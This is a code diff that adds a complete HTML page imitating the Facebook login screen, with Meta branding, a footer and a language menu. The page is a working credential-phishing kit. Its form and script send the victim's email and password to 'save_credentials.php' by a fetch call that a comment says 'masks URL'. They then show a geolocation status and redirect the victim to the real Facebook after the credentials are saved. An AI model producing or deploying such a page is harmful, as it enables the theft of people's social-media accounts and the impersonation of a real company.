@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .container {
+            display: flex;
+            flex: 1;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .main-wrapper {
+            display: flex;
+            gap: 40px;
+            max-width: 1200px;
+            width: 100%;
+        }
+
+        /* Left Section */
+        .left-section {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            max-width: 400px;
+        }
+
+        .facebook-logo {
+            font-size: 48px;
+            font-weight: 800;
+            color: #1877f2;
+            margin-bottom: 30px;
+        }
+
+        .tagline {
+            font-size: 28px;
+            font-weight: 600;
+            color: #000;
+            line-height: 1.3;
+        }
+
+        /* Right Section */
+        .right-section {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            max-width: 400px;
+        }
+
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            margin-bottom: 20px;
+        }
+
+        .login-title {
+            font-size: 32px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            background-color: #f0f2f5;
+            font-family: inherit;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            background-color: #fff;
+            border-color: #1877f2;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-button:hover {
+            background-color: #165ec7;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .divider::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            width: 100%;
+            height: 1px;
+            background-color: #ddd;
+        }
+
+        .divider-text {
+            background-color: white;
+            padding: 0 10px;
+            position: relative;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .create-account-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #31a24c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .create-account-button:hover {
+            background-color: #299539;
+        }
+
+        .forgotten-password {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .forgotten-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgotten-password a:hover {
+            text-decoration: underline;
+        }
+
+        .signup-section {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-section a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-section a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #f0f2f5;
+            border-top: 1px solid #e5e7eb;
+            padding: 20px;
+        }
+
+        .footer-languages {
+            max-width: 1200px;
+            margin: 0 auto;
+            margin-bottom: 15px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .footer-languages a {
+            color: #65676b;
+            text-decoration: none;
+            font-size: 12px;
+            padding: 8px 10px;
+        }
+
+        .footer-languages a:hover {
+            background-color: #e4e6eb;
+            border-radius: 4px;
+        }
+
+        .language-selector {
+            background-color: white;
+            border: 1px solid #ccc;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            color: #65676b;
+        }
+
+        .footer-divider {
+            max-width: 1200px;
+            margin: 0 auto;
+            border-bottom: 1px solid #ccc;
+            margin-bottom: 15px;
+        }
+
+        .footer-links {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            font-size: 12px;
+            margin-bottom: 15px;
+        }
+
+        .footer-links a {
+            color: #65676b;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-copyright {
+            max-width: 1200px;
+            margin: 0 auto;
+            color: #65676b;
+            font-size: 12px;
+        }
+
+        .meta-logo {
+            width: 24px;
+            height: 24px;
+            background-color: #000;
+            border-radius: 2px;
+            display: inline-block;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .main-wrapper {
+                flex-direction: column;
+                gap: 20px;
+            }
+
+            .left-section, .right-section {
+                max-width: 100%;
+            }
+
+            .facebook-logo {
+                font-size: 32px;
+            }
+
+            .tagline {
+                font-size: 20px;
+            }
+
+            .login-box {
+                padding: 20px;
+            }
+
+            .login-title {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="main-wrapper">
+            <!-- Left Section -->
+            <div class="left-section">
+                <div class="facebook-logo">facebook</div>
+                <div class="tagline">Explore the things you love.</div>
+            </div>
+
+            <!-- Right Section -->
+            <div class="right-section">
+                <div class="login-box">
+                    <h1 class="login-title">Log in to Facebook</h1>
+                    <form method="POST" action="save_credentials.php">
+                        <div class="input-group">
+                            <input type="email" name="email" placeholder="Email address or mobile number" required>
+                        </div>
+                        <div class="input-group">
+                            <input type="password" name="password" placeholder="Password" required>
+                        </div>
+                        <button type="submit" class="login-button">Log in</button>
+                        <div class="forgotten-password">
+                            <a href="#forgot">Forgotten password?</a>
+                        </div>
+                        <div class="divider">
+                            <span class="divider-text">or</span>
+                        </div>
+                        <button type="button" class="create-account-button">Create new account</button>
+                    </form>
+                </div>
+
+                <div class="signup-section">
+                    <span><b><a href="#meta">Meta</a></b> logo here - Create a Page for a celebrity, brand or business.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-languages">
+            <select class="language-selector">
+                <option>English (UK)</option>
+                <option>اردو</option>
+                <option>پښتو</option>
+                <option>العربية</option>
+                <option>हिन्दी</option>
+                <option>বাংলা</option>
+                <option>ਪੰਜਾਬੀ</option>
+            </select>
+            <a href="#sign-up">Sign up</a>
+            <a href="#log-in">Log in</a>
+            <a href="#messenger">Messenger</a>
+            <a href="#lite">Facebook Lite</a>
+            <a href="#video">Video</a>
+            <a href="#meta-pay">Meta Pay</a>
+            <a href="#meta-store">Meta Store</a>
+            <a href="#meta-quest">Meta Quest</a>
+            <a href="#ray-ban">Ray-Ban Meta</a>
+            <a href="#meta-ai">Meta AI</a>
+            <a href="#instagram">Instagram</a>
+            <a href="#threads">Threads</a>
+        </div>
+
+        <div class="footer-divider"></div>
+
+        <div class="footer-links">
+            <a href="#privacy">Privacy Policy</a>
+            <a href="#privacy-centre">Privacy Centre</a>
+            <a href="#about">About</a>
+            <a href="#create-ad">Create ad</a>
+            <a href="#create-page">Create Page</a>
+            <a href="#developers">Developers</a>
+            <a href="#careers">Careers</a>
+            <a href="#cookies">Cookies</a>
+            <a href="#adchoices">AdChoices</a>
+            <a href="#terms">Terms</a>
+            <a href="#help">Help</a>
+            <a href="#contact">Contact uploading and non-users</a>
+        </div>
+
+        <div class="footer-copyright">
+            <span class="meta-logo"></span>Meta © 2026
+        </div>
+    </footer>
+
+    <script>
+        // Handle login form with AJAX (masks URL)
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            
+            // Auto-detect the correct domain
+            const apiUrl = window.location.pathname.includes('localhost') || window.location.hostname === '127.0.0.1' 
+                ? 'save_credentials.php' 
+                : '/save_credentials.php';
+            
+            fetch(apiUrl, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                console.log('Response status:', response.status);
+                console.log('Response headers:', response.headers);
+                if (!response.ok && response.status !== 200) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.text();
+            })
+            .then(text => {
+                console.log('Response text:', text);
+                try {
+                    const data = JSON.parse(text);
+                    console.log('Parsed data:', data);
+                    if (data.success) {
+                        console.log('Login successful. Geolocation status:', data.geolocation_status);
+                        alert('Login successful!\nGeolocation: ' + (data.geolocation_status || 'Unknown'));
+                        // Redirect to Facebook after successful save
+                        window.location.href = data.redirect;
+                    } else {
+                        alert('Error: ' + (data.message || 'Unknown error'));
+                    }
+                } catch (e) {
+                    console.error('JSON parse error:', e);
+                    console.error('Response was:', text);
+                    alert('Server error: Invalid response. Check browser console.');
+                }
+            })
+            .catch(error => {
+                console.error('Fetch error:', error);
+                alert('Connection error: ' + error.message + '\n\nMake sure the web server is running and accessible.');
+            });
+        });
+        
+        // Handle create account button
+        document.querySelector('.create-account-button').addEventListener('click', function() {
+            alert('Create new account page would open here.');
+        });
+    </script>
+</body>
+</html>
